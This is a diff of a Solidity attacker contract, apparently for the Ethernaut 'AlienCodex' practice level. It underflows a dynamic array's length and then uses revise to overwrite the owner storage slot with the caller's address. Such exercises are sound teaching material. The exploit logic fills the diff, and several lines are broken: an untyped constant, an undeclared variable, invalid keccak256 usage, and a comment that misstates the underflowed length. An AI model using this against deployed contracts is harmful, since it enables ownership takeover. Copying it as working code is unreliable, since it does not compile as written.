@@ -31,22 +31,23 @@ contract AlienCodex is Ownable {
 }
 
 contract AlienCodexAttacker {
-    AlienCodex public target;
+    AlienCodex public immutable i_target;
+    TOTAL_CONTRACT_SLOTS=(2 ** 256)-1;
 
     constructor(AlienCodex _target) public {
-        target = _target;
+        i_target = _target;
     }
 
     function attack() public {
-        target.make_contact();
+        i_target.make_contact();
         //retracting it will change the length to below its limits and cause an overflow
-        target.retract();
+        i_target.retract(); // now codex.length is 2**256, since it undeflowed from 0 to the maximum
         dynamicArrayPosition = keccak256(1);
-        uint256 ownerSlot = ((2 ** 256) - 1) -
+        uint256 ownerSlot = TOTAL_CONTRACT_SLOTS -
             uint256(keccak256(abi.encode(1))) +
             1;
 
         bytes32 senderAddress = bytes32(uint256(uint160(msg.sender)));
-        target.revise(ownerSlot, senderAddress);
+        i_target.revise(ownerSlot, senderAddress);
     }
 }
